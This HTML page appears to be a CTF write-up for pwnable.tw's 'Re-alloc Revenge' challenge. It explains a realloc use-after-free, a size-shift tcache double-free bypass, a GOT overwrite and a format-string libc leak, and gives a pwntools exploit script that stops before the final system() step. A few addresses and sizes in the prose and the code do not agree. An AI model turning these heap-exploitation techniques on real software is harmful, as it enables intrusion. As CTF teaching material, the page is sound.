@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Re-alloc Revenge — pwnable.tw — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.breadcrumb{display:flex;align-items:center;gap:8px;padding:18px 0 0;font-size:.78rem;color:var(--muted)}
+.breadcrumb a{color:var(--muted);text-decoration:none;transition:color .2s}
+.breadcrumb a:hover{color:var(--accent)}
+.breadcrumb .sep{color:var(--border)}.breadcrumb .current{color:var(--fg);font-weight:600}
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}.section li{margin-bottom:6px;color:var(--fg)}
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}.callout-hint .callout-title{color:var(--accent2)}
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.timeline{position:relative;padding-left:26px;margin:18px 0}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.timeline-item{position:relative;margin-bottom:18px}
+.timeline-item::before{content:'';position:absolute;left:-22px;top:6px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg)}
+.timeline-item .tl-time{font-size:.68rem;font-family:var(--mono);color:var(--accent);margin-bottom:2px}
+.timeline-item .tl-text{font-size:.83rem;color:var(--fg)}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+.stack-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;margin:14px 0;font-family:var(--mono);font-size:.76rem;line-height:1.7}
+.stack-row{display:flex;align-items:center;gap:10px;padding:3px 0;border-bottom:1px solid rgba(30,41,59,.5)}.stack-row:last-child{border-bottom:none}
+.stack-addr{color:var(--accent);min-width:80px;font-size:.72rem}.stack-label{color:var(--muted);min-width:140px;font-size:.72rem}.stack-value{color:var(--fg);font-size:.72rem}
+.stack-overflow{color:var(--red);font-weight:700}.stack-controlled{color:var(--green);font-weight:700}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){.toc{display:none}.main{padding:20px 18px 60px}.hero h1{font-size:1.5rem}.hero .meta-grid{grid-template-columns:repeat(2,1fr)}.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}.nav-main a:not(.active){display:none}.mobile-toggle{display:block}.site-header{padding:0 16px}}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+<canvas id="bg-canvas"></canvas>
+<header class="site-header"><a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a><nav class="nav-main"><a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a><a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a></nav><div class="nav-right"><a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a><button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button></div></header>
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel"><button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button><nav><a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a><a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a></nav></div>
+<div class="page-wrap">
+<nav class="toc" id="toc"><h3>Table of Contents</h3><a href="#recon">1. Reconnaissance</a><a class="toc-sub" href="#recon-file">File Analysis</a><a class="toc-sub" href="#recon-checksec">Checksec</a><a class="toc-sub" href="#recon-run">Running the Binary</a><a href="#static">2. Static Analysis</a><a class="toc-sub" href="#static-realloc">Realloc Semantics</a><a class="toc-sub" href="#static-vuln">Vulnerability: realloc(ptr, 0) UAF</a><a class="toc-sub" href="#static-bypass">Tcache Double-Free Bypass</a><a href="#gdb">3. GDB Debugging</a><a class="toc-sub" href="#gdb-tcache">Tcache State</a><a class="toc-sub" href="#gdb-breakpoints">Breakpoints</a><a href="#strategy">4. Exploit Strategy</a><a class="toc-sub" href="#strategy-overview">Attack Overview</a><a class="toc-sub" href="#strategy-arbwrite">Arbitrary Write</a><a class="toc-sub" href="#strategy-leak">Libc Leak</a><a href="#pwn">5. Pwn Script</a><a class="toc-sub" href="#pwn-full">Full Exploit</a><a href="#results">6. Execution Results</a></nav>
+<div class="main">
+<div class="breadcrumb"><a href="/">Home</a><span class="sep"><i class="bi bi-chevron-right"></i></span><a href="/pwnable-tw/">Pwnable.tw</a><span class="sep"><i class="bi bi-chevron-right"></i></span><span class="current">Re-alloc Revenge</span></div>
+<section class="hero">
+  <span class="badge">pwnable.tw &mdash; 350 pts</span>
+  <h1>Re-alloc Revenge</h1>
+  <p class="sub">Realloc UAF + Tcache Double-Free Bypass &mdash; Size-shift trick to poison tcache on glibc 2.29</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">64-bit</div><div class="lbl">Architecture</div></div>
+    <div class="meta-box"><div class="val">UAF</div><div class="lbl">Vuln Type</div></div>
+    <div class="meta-box"><div class="val">2.29</div><div class="lbl">glibc</div></div>
+    <div class="meta-box"><div class="val">Tcache</div><div class="lbl">Technique</div></div>
+  </div>
+</section>
+<div class="attack-path"><h3>Exploit Flow</h3><div class="path-flow">
+  <div class="path-node">Connect<br><small>nc chall.pwnable.tw 10106</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Alloc+Free<br><small>realloc(ptr, 0) = free</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Size-Shift<br><small>Resize Chunk, Bypass Check</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Tcache Poison<br><small>Double-Free via Size Shift</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">GOT Overwrite<br><small>atoll → printf → system</small></div><span class="path-arrow">&rarr;</span>
+  <div class="path-node">Shell<br><small>system("/bin/sh")</small></div>
+</div></div>
+
+<section class="section" id="recon">
+  <h2><i class="bi bi-search"></i> 1. Reconnaissance</h2>
+  <p>Re-alloc Revenge is the harder version of the Re-alloc challenge (200 pts). While the original Re-alloc uses glibc 2.23, Revenge uses <strong>glibc 2.29</strong>, which adds tcache double-free protection. The binary uses <code>realloc</code> as the only heap operation &mdash; all allocate, free, and resize operations go through <code>realloc()</code>. The vulnerability is a UAF caused by <code>realloc(ptr, 0)</code> not nulling the pointer in the global array.</p>
+
+  <h3 id="recon-file">File Analysis</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ file realloc
+realloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
+dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped</code></pre></div>
+
+  <h3 id="recon-checksec">Checksec</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ checksec realloc
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre></div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Partial RELRO + No PIE</div>
+    <p>Partial RELRO means the GOT is writable! This is our target for the write primitive. No PIE means all addresses in the binary are fixed. The GOT entry for <code>atoll</code> at a known address will be our primary target for patching.</p>
+  </div>
+
+  <h3 id="recon-run">Running the Binary</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ ./realloc
+1. Allocate
+2. Reallocate
+3. Free
+Your choice: 1
+Index: 0
+Size: 64
+Data: AAAA
+
+1. Allocate
+2. Reallocate
+3. Free
+Your choice: 2
+Index: 0
+Size: 0     # realloc(ptr, 0) = free! But ptr not nulled!
+
+1. Allocate
+2. Reallocate
+3. Free
+Your choice: 2
+Index: 0
+Size: 64    # realloc(NULL, 64) = malloc(64) — but we have UAF!
+Data: BBBB</code></pre></div>
+
+  <table class="data-table">
+    <thead><tr><th>Attribute</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Challenge</td><td>Re-alloc Revenge (350 pts)</td></tr>
+      <tr><td>Connection</td><td><code>nc chall.pwnable.tw 10106</code></td></tr>
+      <tr><td>Binary</td><td>64-bit ELF, x86-64, dynamically linked</td></tr>
+      <tr><td>Libc</td><td>glibc 2.29 (tcache + double-free check)</td></tr>
+      <tr><td>RELRO</td><td>Partial (GOT writable)</td></tr>
+      <tr><td>Canary</td><td>None</td></tr>
+      <tr><td>NX</td><td>Enabled</td></tr>
+      <tr><td>PIE</td><td>Disabled</td></tr>
+      <tr><td>Vulnerability</td><td>UAF via realloc(ptr, 0)</td></tr>
+      <tr><td>Max Size</td><td>120 bytes (tcache only)</td></tr>
+      <tr><td>Max Chunks</td><td>2</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section class="section" id="static">
+  <h2><i class="bi bi-code-slash"></i> 2. Static Analysis</h2>
+
+  <h3 id="static-realloc">Realloc Semantics</h3>
+  <p>The challenge uses <code>realloc()</code> as the sole heap interface. Understanding realloc's behavior is critical:</p>
+  <table class="data-table">
+    <thead><tr><th>Call</th><th>Equivalent</th><th>Effect</th></tr></thead>
+    <tbody>
+      <tr><td><code>realloc(ptr, size)</code></td><td>resize</td><td>Expand or shrink the chunk. If size = old size, no-op (returns same ptr).</td></tr>
+      <tr><td><code>realloc(ptr, 0)</code></td><td><code>free(ptr)</code></td><td>Frees the chunk but <strong>doesn't null the global pointer</strong>!</td></tr>
+      <tr><td><code>realloc(NULL, size)</code></td><td><code>malloc(size)</code></td><td>Allocates a new chunk.</td></tr>
+    </tbody>
+  </table>
+
+  <h3 id="static-vuln">Vulnerability: realloc(ptr, 0) UAF</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-c">void *heap_ptrs[2];   // global chunk pointer array
+int heap_sizes[2];    // sizes for each chunk
+
+void reallocate() {
+    printf("Index: ");
+    int idx = read_int();
+    printf("Size: ");
+    int size = read_int();
+
+    if (size == 0) {
+        // realloc(ptr, 0) acts as free(ptr)
+        realloc(heap_ptrs[idx], 0);
+        // BUG: heap_ptrs[idx] is NOT set to NULL!
+        // This creates a Use-After-Free condition
+    } else if (heap_ptrs[idx] == NULL) {
+        // realloc(NULL, size) acts as malloc(size)
+        heap_ptrs[idx] = realloc(NULL, size);
+        read_data(heap_ptrs[idx], size);
+    } else {
+        // realloc(ptr, size) — resize
+        heap_ptrs[idx] = realloc(heap_ptrs[idx], size);
+        read_data(heap_ptrs[idx], size);
+    }
+}</code></pre></div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">The Missing Null</div>
+    <p>After <code>realloc(ptr, 0)</code>, the pointer <code>heap_ptrs[idx]</code> is not set to <code>NULL</code>. This means the program still thinks the chunk is allocated. Subsequent operations on this index will operate on freed memory &mdash; a classic Use-After-Free. Since the chunk is in tcache (size ≤ 120), we can manipulate tcache freelist pointers.</p>
+  </div>
+
+  <h3 id="static-bypass">Tcache Double-Free Bypass</h3>
+  <p>Glibc 2.29 added a key field to tcache entries to detect double-frees. When a chunk is freed into tcache, <code>tcache->entries[i]->key</code> is set to <code>tcache</code>. On the next free, if the chunk's <code>key</code> matches <code>tcache</code>, glibc detects the double-free and aborts. However, there's a bypass:</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Size-Shift Bypass</div>
+    <p>The tcache double-free check only looks at the freelist corresponding to the chunk's current size. If we free a chunk of size <code>0x20</code> (goes into tcache bin 0x20), then <strong>resize it</strong> to size <code>0x30</code> using <code>realloc</code> via UAF, and then free it again, the second free puts it into tcache bin 0x30. The double-free check in bin 0x30 doesn't find it because it was originally freed into bin 0x20! This gives us a double-free that bypasses the glibc 2.29 protection.</p>
+  </div>
+
+  <p>The exploit sequence for tcache poisoning:</p>
+  <ol>
+    <li>Allocate chunk at index 0 with size 0x20</li>
+    <li>Free it: <code>realloc(ptr, 0)</code> &mdash; chunk goes to tcache bin 0x20</li>
+    <li>Reallocate with target address as data: writes target into the freed chunk's data area</li>
+    <li>Resize the chunk: <code>realloc(ptr, 0x30)</code> &mdash; this changes the chunk's size</li>
+    <li>Free again: <code>realloc(ptr, 0)</code> &mdash; chunk goes to tcache bin 0x30 (different bin!)</li>
+    <li>The target address is now in tcache's freelist for both bins</li>
+  </ol>
+</section>
+
+<section class="section" id="gdb">
+  <h2><i class="bi bi-bug"></i> 3. GDB Debugging</h2>
+  <h3 id="gdb-tcache">Tcache State After Size-Shift Double-Free</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># After allocating and freeing chunk at index 0 (size 0x20):
+gdb-peda$ heap bins tcache
+tcache:
+0x20 [1]: 0x5555557572a0 → 0x0
+
+# After UAF realloc with TARGET_ADDR data:
+gdb-peda$ x/gx 0x5555557572a0
+0x5555557572a0: 0x0000000000404040  ← TARGET_ADDR in freed chunk's data
+
+# After resizing to 0x30 and freeing again:
+gdb-peda$ heap bins tcache
+tcache:
+0x20 [1]: 0x5555557572a0 → 0x404040  ← first free, fd = TARGET_ADDR
+0x30 [1]: 0x5555557572a0 → 0x0       ← second free (different bin!)
+
+# Now allocating from 0x20 bin returns the chunk,
+# and the next allocation from 0x20 bin returns TARGET_ADDR!</code></pre></div>
+
+  <h3 id="gdb-breakpoints">Breakpoint Strategy</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">gdb</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">b realloc@plt   # track all realloc calls
+b free@plt      # track all free calls
+b *0x4012ab     # reallocate function: realloc call with size 0
+b *0x401312     # after realloc returns — check tcache poisoning</code></pre></div>
+</section>
+
+<section class="section" id="strategy">
+  <h2><i class="bi bi-crosshair"></i> 4. Exploit Strategy</h2>
+  <h3 id="strategy-overview">Attack Overview</h3>
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="tl-time">Phase 1: Arbitrary Write via Tcache Poisoning</div>
+      <div class="tl-text">Use the size-shift double-free bypass to pollute two tcache bins with the target address. Allocate from the poisoned bin to get a chunk at the target address. This gives us arbitrary write. The target is <code>atoll@GOT</code> since we fully control <code>atoll</code>'s first argument (user input).</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Phase 2: Libc Leak via Format String</div>
+      <div class="tl-text">Patch <code>atoll@GOT</code> with <code>printf@PLT</code>. Now every call to <code>atoll(input)</code> becomes <code>printf(input)</code>. Use format string <code>%21$p</code> to leak the return address of <code>main</code> (which is <code>__libc_start_main+offset</code>). Calculate libc base from this leak.</div>
+    </div>
+    <div class="timeline-item">
+      <div class="tl-time">Phase 3: Code Execution</div>
+      <div class="tl-text">Now that we know libc base, patch <code>atoll@GOT</code> again with <code>system</code>. Call <code>atoll("/bin/sh")</code> which becomes <code>system("/bin/sh")</code>. Get shell!</div>
+    </div>
+  </div>
+
+  <h3 id="strategy-arbwrite">Arbitrary Write Primitive</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Pollute tcache 0x20 bin with TARGET_ADDR
+app.alloc(1, 'AAAA', 20)        # allocate chunk at idx 1
+app.realloc(1)                   # free: realloc(ptr, 0) — chunk in tcache 0x20
+app.realloc(1, TARGET_ADDR, 20)  # UAF: write target into freed chunk
+app.alloc(0, 'AAAAA', 20)       # allocate from tcache 0x20
+
+# Now resize and free again (size-shift bypass)
+app.realloc(1, 'AAA', 100)      # resize chunk at idx 1
+app.free(1)                      # free again — goes to tcache 0x30 (different bin!)
+
+# First allocation from 0x20 bin returns original chunk
+# Second allocation from 0x20 bin returns TARGET_ADDR!</code></pre></div>
+
+  <h3 id="strategy-leak">Libc Leak</h3>
+  <div class="callout callout-warn">
+    <div class="callout-title">atoll → printf Patch</div>
+    <p>Overwriting <code>atoll@GOT</code> with <code>printf@PLT</code> is elegant because: (1) both take a <code>char*</code> first argument, (2) we control that argument through user input, (3) printf's format string gives us arbitrary read via <code>%p</code>. The stack offset 21 contains <code>__libc_start_main+240</code> which is a libc address. Subtract the offset to get libc base.</p>
+  </div>
+
+  <div class="code-block"><div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python"># Patch atoll with printf
+PRINTF_PLT = p64(0x401070)
+app.alloc(0, PRINTF_PLT, 40)    # write printf@PLT to atoll@GOT
+
+# Leak libc via format string
+def leak_stack(offset):
+    io.sendline('3')             # trigger atoll (now printf)
+    f_str = '%' + str(offset) + '$p'
+    io.sendline(f_str)
+    val = io.readline().decode('utf-8')
+    addr = val[7:21].strip()
+    return int(addr, 16)
+
+libc_start_main = leak_stack(21)
+libc_base = libc_start_main - 0x26b6b
+log.info('Libc Base : ' + hex(libc_base))</code></pre></div>
+</section>
+
+<section class="section" id="pwn">
+  <h2><i class="bi bi-terminal"></i> 5. Pwn Script</h2>
+  <h3 id="pwn-full">Full Exploit</h3>
+  <div class="code-block"><div class="code-header"><span class="lang-tag">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+# Re-alloc Revenge — pwnable.tw
+# Realloc UAF + Tcache Size-Shift Double-Free Bypass
+# Based on writeup by 0xd3xt3r (taintedbits.com)
+from pwn import *
+
+exe = context.binary = ELF('./realloc')
+LIBC_BIN = './libc-ctf.so'
+
+if args.REMOTE:
+    io = remote('chall.pwnable.tw', 10106)
+else:
+    io = process([exe.path], env={'LD_PRELOAD': './libc.so.6'}, timeout=1)
+
+class App:
+    def __init__(self, proc):
+        self.pp = proc
+
+    def intro(self):
+        self.pp.readuntil(':')
+
+    def alloc(self, idx, content, size=None):
+        if size is None: size = len(content)
+        self.pp.sendline('1')
+        self.pp.readuntil(':')
+        self.pp.sendline(str(idx))
+        self.pp.readuntil(':')
+        self.pp.sendline(str(size))
+        self.pp.readuntil(':')
+        self.pp.send(content)
+        self.pp.readuntil(':')
+
+    def realloc(self, idx, content='', size=None):
+        if size is None: size = len(content)
+        self.pp.sendline('2')
+        self.pp.readuntil(':')
+        self.pp.sendline(str(idx))
+        self.pp.readuntil(':')
+        self.pp.sendline(str(size))
+        if size != 0:
+            self.pp.readuntil(':')
+            self.pp.send(content)
+            self.pp.readuntil(':')
+
+    def free(self, idx):
+        self.pp.sendline('3')
+        self.pp.readuntil(':')
+        self.pp.sendline(str(idx))
+        self.pp.readuntil(':')
+
+app = App(io)
+app.intro()
+
+# === Phase 1: Tcache poisoning with size-shift double-free bypass ===
+TARGET_ADDR = exe.got['atoll']  # 0x404048
+
+# Pollute 0x20 tcache bin with TARGET_ADDR
+app.alloc(1, 'AAAA', 20)             # idx 1, size 0x20
+app.realloc(1)                         # free idx 1 (tcache 0x20)
+app.realloc(1, p64(TARGET_ADDR), 20)  # UAF: write target to freed chunk's fd
+app.alloc(0, 'AAAAA', 20)             # consume first entry in 0x20 bin
+
+# Size-shift: resize and free again (bypass double-free check)
+app.realloc(1, 'AAAA', 100)           # resize idx 1
+app.free(1)                            # free idx 1 — now in tcache 0x30 bin
+
+# Pollute 0x30 tcache bin with TARGET_ADDR
+app.alloc(0, 'AAAA', 30)             # idx 0, size 0x30
+app.realloc(0)                         # free idx 0 (tcache 0x30)
+app.realloc(0, p64(TARGET_ADDR), 30)  # UAF: write target to freed chunk
+app.alloc(1, 'AAAA', 30)             # consume first entry in 0x30 bin
+
+# Now allocate from poisoned bins to get arbitrary write
+app.realloc(1, 'AAAA', 50)           # resize idx 1
+app.free(1)
+app.realloc(0, 'AAAA', 70)           # resize idx 0
+app.free(0)
+
+# === Phase 2: Patch atoll@GOT with printf@PLT ===
+PRINTF_PLT = p64(0x401070)
+app.alloc(0, PRINTF_PLT, 40)         # write to atoll@GOT
+
+# === Phase 3: Leak libc via format string ===
+def leak_stack(offset):
+    io.sendline('3')
+    f_str = '%' + str(offset) + '$p'
+    io.sendline(f_str)
+    val = io.readline().decode('utf-8')
+    addr = val[7:21].strip()
+    return int(addr, 16)
+
+libc_start_main = leak_stack(21)
+libc_base = libc_start_main - 0x26b6b
+log.info('Libc Base : ' + hex(libc_base))
+
+# === Phase 4: Patch atoll@GOT with system ===
+libc = ELF(LIBC_BIN)
+system_addr = libc_base + libc.sym['system']
